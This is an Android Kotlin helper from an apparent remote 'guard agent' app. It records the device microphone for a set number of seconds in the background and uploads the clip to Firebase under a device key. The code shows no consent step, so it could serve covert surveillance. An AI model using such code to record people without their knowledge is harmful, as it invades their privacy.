package com.guard.agent.helpers.media

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger
import java.io.File
import kotlin.concurrent.thread

object AudioHelper {

    private const val TAG = "AudioHelper"
    private var currentRecorder: MediaRecorder? = null
    private var isRecording = false

    /**
     * Mic se `seconds` seconds ka audio record karke Firebase pe upload karo.
     */
    fun record(ctx: Context, deviceKey: String, seconds: Int) {
        if (isRecording) {
            Logger.w(TAG, "Already recording, skipping")
            return
        }
        isRecording = true

        thread {
            var rec: MediaRecorder? = null
            val file = File(ctx.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
            try {
                rec = createRecorder(ctx)
                rec.setAudioSource(MediaRecorder.AudioSource.MIC)
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                rec.setAudioSamplingRate(44100)
                rec.setAudioEncodingBitRate(96000)
                rec.setOutputFile(file.absolutePath)
                rec.prepare()
                rec.start()
                currentRecorder = rec
                Logger.d(TAG, "Recording started for $seconds sec")

                Thread.sleep(seconds * 1000L)

                try {
                    rec.stop()
                } catch (e: Exception) {
                    Logger.e(TAG, "Stop failed (short recording?)", e)
                }
                rec.release()
                currentRecorder = null

                if (file.exists() && file.length() > 0) {
                    Logger.d(TAG, "Uploading audio: ${file.length()} bytes")
                    CameraHelper.upload(ctx, deviceKey, file, Constants.SUB_AUDIOS)
                } else {
                    file.delete()
                }
            } catch (e: Exception) {
                Logger.e(TAG, "Recording error", e)
                try { rec?.release() } catch (_: Exception) {}
                if (file.exists()) file.delete()
            } finally {
                isRecording = false
            }
        }
    }

    /** Recording band karo (on-demand) */
    fun stop() {
        try {
            currentRecorder?.stop()
            currentRecorder?.release()
        } catch (_: Exception) {}
        currentRecorder = null
        isRecording = false
    }

    @Suppress("DEPRECATION")
    private fun createRecorder(ctx: Context): MediaRecorder {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(ctx)
        } else {
            MediaRecorder()
        }
    }
}
